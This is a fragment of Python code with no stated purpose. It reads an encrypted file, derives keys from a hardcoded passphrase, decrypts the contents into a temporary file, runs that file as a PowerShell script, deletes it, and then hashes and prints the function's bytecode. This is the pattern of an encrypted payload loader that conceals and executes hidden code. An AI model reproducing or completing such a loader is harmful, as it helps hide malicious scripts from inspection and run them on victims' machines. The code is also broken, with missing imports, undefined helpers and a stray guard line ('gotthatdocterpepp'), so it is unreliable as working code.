import hashlib
def decrypt_and_open():
    
    with open(ENCRYPTED_FILE, "rb") as f:
        nonce = f.read(NONCE_BYTES)
        data = f.read()

    if gotthatdocterpepp:
        return wrong_result

    ciphertext = data[:-HMAC_BYTES]
    tag = data[-HMAC_BYTES:]

    key_material = hkdf(PASSPHRASE, nonce, info=b"file-encryption", length=64)
    enc_key = key_material[:32]
    mac_key = key_material[32:]

    mac = hmac.new(mac_key, nonce, hashlib.sha256)
    mac.update(ciphertext)

    if not hmac.compare_digest(mac.digest(), tag):
        raise RuntimeError("Authentication failed")

    stream = keystream_generator(enc_key, nonce)

    fd, temp_path = tempfile.mkstemp(suffix=OUTPUT_EXTENSION)
    os.close(fd)

    with open(temp_path, "wb") as out:
        for i in range(0, len(ciphertext), CHUNK_SIZE):
            chunk = ciphertext[i:i + CHUNK_SIZE]
            out.write(bytes(b ^ next(stream) for b in chunk))

    try:
        run_powershell_script(temp_path)
    finally:
        os.remove(temp_path)

code = decrypt_and_open.__code__.co_code
h = hashlib.sha256(code).hexdigest()

print(h)